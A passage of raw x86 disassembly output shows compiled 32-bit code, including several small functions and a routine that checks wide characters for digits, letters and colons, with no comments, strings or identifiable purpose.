  404328:	55                   	push   %ebp
  404329:	8b ec                	mov    %esp,%ebp
  40432b:	83 ec 18             	sub    $0x18,%esp
  40432e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404331:	e8 b5 d1 ff ff       	call   0x4014eb
  404336:	ff 75 0c             	push   0xc(%ebp)
  404339:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40433c:	e8 fb d0 ff ff       	call   0x40143c
  404341:	68 e8 a7 41 00       	push   $0x41a7e8
  404346:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404349:	e8 6a e7 ff ff       	call   0x402ab8
  40434e:	68 20 a8 41 00       	push   $0x41a820
  404353:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404356:	e8 0c e7 ff ff       	call   0x402a67
  40435b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40435e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404361:	50                   	push   %eax
  404362:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404365:	50                   	push   %eax
  404366:	e8 cc fd ff ff       	call   0x404137
  40436b:	ff 75 e8             	push   -0x18(%ebp)
  40436e:	e8 f7 4e 01 00       	call   0x41926a
  404373:	59                   	pop    %ecx
  404374:	ff 75 0c             	push   0xc(%ebp)
  404377:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40437a:	e8 bd d0 ff ff       	call   0x40143c
  40437f:	68 d8 a7 41 00       	push   $0x41a7d8
  404384:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404387:	e8 2c e7 ff ff       	call   0x402ab8
  40438c:	68 14 a8 41 00       	push   $0x41a814
  404391:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404394:	e8 ce e6 ff ff       	call   0x402a67
  404399:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40439c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40439f:	50                   	push   %eax
  4043a0:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4043a3:	50                   	push   %eax
  4043a4:	e8 8e fd ff ff       	call   0x404137
  4043a9:	ff 75 e8             	push   -0x18(%ebp)
  4043ac:	e8 b9 4e 01 00       	call   0x41926a
  4043b1:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4043b4:	c7 04 24 0c a8 41 00 	movl   $0x41a80c,(%esp)
  4043bb:	e8 a7 e6 ff ff       	call   0x402a67
  4043c0:	ff 75 0c             	push   0xc(%ebp)
  4043c3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4043c6:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4043c9:	50                   	push   %eax
  4043ca:	e8 68 fd ff ff       	call   0x404137
  4043cf:	ff 75 e8             	push   -0x18(%ebp)
  4043d2:	e8 93 4e 01 00       	call   0x41926a
  4043d7:	ff 75 f4             	push   -0xc(%ebp)
  4043da:	e8 8b 4e 01 00       	call   0x41926a
  4043df:	59                   	pop    %ecx
  4043e0:	59                   	pop    %ecx
  4043e1:	c9                   	leave
  4043e2:	c3                   	ret
  4043e3:	55                   	push   %ebp
  4043e4:	8b ec                	mov    %esp,%ebp
  4043e6:	83 ec 0c             	sub    $0xc,%esp
  4043e9:	68 2c a8 41 00       	push   $0x41a82c
  4043ee:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4043f1:	e8 71 e6 ff ff       	call   0x402a67
  4043f6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4043f9:	68 24 ea 41 00       	push   $0x41ea24
  4043fe:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404401:	50                   	push   %eax
  404402:	e8 30 fd ff ff       	call   0x404137
  404407:	ff 75 f4             	push   -0xc(%ebp)
  40440a:	e8 5b 4e 01 00       	call   0x41926a
  40440f:	59                   	pop    %ecx
  404410:	c9                   	leave
  404411:	c3                   	ret
  404412:	55                   	push   %ebp
  404413:	8b ec                	mov    %esp,%ebp
  404415:	83 ec 24             	sub    $0x24,%esp
  404418:	56                   	push   %esi
  404419:	ff 75 08             	push   0x8(%ebp)
  40441c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40441f:	50                   	push   %eax
  404420:	e8 bb ef ff ff       	call   0x4033e0
  404425:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404428:	50                   	push   %eax
  404429:	e8 b4 00 00 00       	call   0x4044e2
  40442e:	83 c4 0c             	add    $0xc,%esp
  404431:	68 3c a8 41 00       	push   $0x41a83c
  404436:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  404439:	e8 29 e6 ff ff       	call   0x402a67
  40443e:	68 34 a8 41 00       	push   $0x41a834
  404443:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  404446:	e8 1c e6 ff ff       	call   0x402a67
  40444b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40444e:	50                   	push   %eax
  40444f:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404452:	50                   	push   %eax
  404453:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404456:	e8 dc fc ff ff       	call   0x404137
  40445b:	ff 75 e8             	push   -0x18(%ebp)
  40445e:	e8 07 4e 01 00       	call   0x41926a
  404463:	ff 75 dc             	push   -0x24(%ebp)
  404466:	e8 ff 4d 01 00       	call   0x41926a
  40446b:	59                   	pop    %ecx
  40446c:	59                   	pop    %ecx
  40446d:	ff 75 f4             	push   -0xc(%ebp)
  404470:	ff 75 08             	push   0x8(%ebp)
  404473:	ff 15 d4 a2 41 00    	call   *0x41a2d4
  404479:	ff 75 f4             	push   -0xc(%ebp)
  40447c:	8b f0                	mov    %eax,%esi
  40447e:	e8 e7 4d 01 00       	call   0x41926a
  404483:	59                   	pop    %ecx
  404484:	8b c6                	mov    %esi,%eax
  404486:	5e                   	pop    %esi
  404487:	c9                   	leave
  404488:	c3                   	ret
  404489:	6a 00                	push   $0x0
  40448b:	ff 71 04             	push   0x4(%ecx)
  40448e:	ff 15 bc a2 41 00    	call   *0x41a2bc
  404494:	c3                   	ret
  404495:	56                   	push   %esi
  404496:	8b f1                	mov    %ecx,%esi
  404498:	e8 4d 3f 00 00       	call   0x4083ea
  40449d:	c7 06 98 b4 41 00    	movl   $0x41b498,(%esi)
  4044a3:	c7 46 38 d6 07 00 00 	movl   $0x7d6,0x38(%esi)
  4044aa:	8b c6                	mov    %esi,%eax
  4044ac:	5e                   	pop    %esi
  4044ad:	c3                   	ret
  4044ae:	56                   	push   %esi
  4044af:	8b 74 24 08          	mov    0x8(%esp),%esi
  4044b3:	56                   	push   %esi
  4044b4:	e8 ae e9 ff ff       	call   0x402e67
  4044b9:	c7 04 24 f4 e9 41 00 	movl   $0x41e9f4,(%esp)
  4044c0:	56                   	push   %esi
  4044c1:	e8 a7 fd ff ff       	call   0x40426d
  4044c6:	68 00 ea 41 00       	push   $0x41ea00
  4044cb:	56                   	push   %esi
  4044cc:	e8 57 fe ff ff       	call   0x404328
  4044d1:	56                   	push   %esi
  4044d2:	e8 0c ff ff ff       	call   0x4043e3
  4044d7:	56                   	push   %esi
  4044d8:	e8 8a e9 ff ff       	call   0x402e67
  4044dd:	83 c4 18             	add    $0x18,%esp
  4044e0:	5e                   	pop    %esi
  4044e1:	c3                   	ret
  4044e2:	56                   	push   %esi
  4044e3:	8b 74 24 08          	mov    0x8(%esp),%esi
  4044e7:	56                   	push   %esi
  4044e8:	e8 7a e9 ff ff       	call   0x402e67
  4044ed:	c7 04 24 e8 e9 41 00 	movl   $0x41e9e8,(%esp)
  4044f4:	56                   	push   %esi
  4044f5:	e8 b8 fc ff ff       	call   0x4041b2
  4044fa:	56                   	push   %esi
  4044fb:	e8 ae ff ff ff       	call   0x4044ae
  404500:	83 c4 0c             	add    $0xc,%esp
  404503:	5e                   	pop    %esi
  404504:	c3                   	ret
  404505:	53                   	push   %ebx
  404506:	56                   	push   %esi
  404507:	8b 35 f4 a0 41 00    	mov    0x41a0f4,%esi
  40450d:	57                   	push   %edi
  40450e:	ff 74 24 14          	push   0x14(%esp)
  404512:	ff d6                	call   *%esi
  404514:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404518:	53                   	push   %ebx
  404519:	8b f8                	mov    %eax,%edi
  40451b:	ff d6                	call   *%esi
  40451d:	3b c7                	cmp    %edi,%eax
  40451f:	7c 18                	jl     0x404539
  404521:	57                   	push   %edi
  404522:	ff 74 24 18          	push   0x18(%esp)
  404526:	53                   	push   %ebx
  404527:	ff 15 2c a2 41 00    	call   *0x41a22c
  40452d:	83 c4 0c             	add    $0xc,%esp
  404530:	85 c0                	test   %eax,%eax
  404532:	75 05                	jne    0x404539
  404534:	8d 04 7b             	lea    (%ebx,%edi,2),%eax
  404537:	eb 02                	jmp    0x40453b
  404539:	33 c0                	xor    %eax,%eax
  40453b:	5f                   	pop    %edi
  40453c:	5e                   	pop    %esi
  40453d:	5b                   	pop    %ebx
  40453e:	c3                   	ret
  40453f:	ff 74 24 08          	push   0x8(%esp)
  404543:	ff 74 24 08          	push   0x8(%esp)
  404547:	e8 b9 ff ff ff       	call   0x404505
  40454c:	85 c0                	test   %eax,%eax
  40454e:	59                   	pop    %ecx
  40454f:	59                   	pop    %ecx
  404550:	74 3b                	je     0x40458d
  404552:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404556:	49                   	dec    %ecx
  404557:	74 61                	je     0x4045ba
  404559:	49                   	dec    %ecx
  40455a:	74 34                	je     0x404590
  40455c:	49                   	dec    %ecx
  40455d:	75 51                	jne    0x4045b0
  40455f:	66 83 78 02 3a       	cmpw   $0x3a,0x2(%eax)
  404564:	75 27                	jne    0x40458d
  404566:	0f b7 08             	movzwl (%eax),%ecx
  404569:	66 83 f9 30          	cmp    $0x30,%cx
  40456d:	72 06                	jb     0x404575
  40456f:	66 83 f9 39          	cmp    $0x39,%cx
  404573:	76 5b                	jbe    0x4045d0
  404575:	66 83 f9 61          	cmp    $0x61,%cx
  404579:	72 06                	jb     0x404581
  40457b:	66 83 f9 7a          	cmp    $0x7a,%cx
  40457f:	76 4f                	jbe    0x4045d0
  404581:	66 83 f9 41          	cmp    $0x41,%cx
  404585:	72 06                	jb     0x40458d
  404587:	66 83 f9 5a          	cmp    $0x5a,%cx
  40458b:	76 43                	jbe    0x4045d0
  40458d:	33 c0                	xor    %eax,%eax
  40458f:	c3                   	ret
  404590:	0f b7 08             	movzwl (%eax),%ecx
  404593:	66 83 f9 30          	cmp    $0x30,%cx
  404597:	72 f4                	jb     0x40458d
  404599:	66 83 f9 39          	cmp    $0x39,%cx
  40459d:	77 ee                	ja     0x40458d
  40459f:	66 83 f9 39          	cmp    $0x39,%cx
  4045a3:	77 0b                	ja     0x4045b0
  4045a5:	40                   	inc    %eax
  4045a6:	40                   	inc    %eax
  4045a7:	0f b7 08             	movzwl (%eax),%ecx
  4045aa:	66 83 f9 30          	cmp    $0x30,%cx
  4045ae:	73 ef                	jae    0x40459f
  4045b0:	66 83 38 3a          	cmpw   $0x3a,(%eax)
  4045b4:	75 d7                	jne    0x40458d
  4045b6:	83 c0 02             	add    $0x2,%eax
  4045b9:	c3                   	ret
  4045ba:	0f b7 08             	movzwl (%eax),%ecx
  4045bd:	66 83 f9 30          	cmp    $0x30,%cx
  4045c1:	72 ca                	jb     0x40458d
  4045c3:	66 83 f9 39          	cmp    $0x39,%cx
  4045c7:	77 c4                	ja     0x40458d
  4045c9:	66 83 78 02 3a       	cmpw   $0x3a,0x2(%eax)
  4045ce:	75 bd                	jne    0x40458d
  4045d0:	83 c0 04             	add    $0x4,%eax
  4045d3:	c3                   	ret
  4045d4:	56                   	push   %esi
  4045d5:	8b 74 24 08          	mov    0x8(%esp),%esi
  4045d9:	57                   	push   %edi
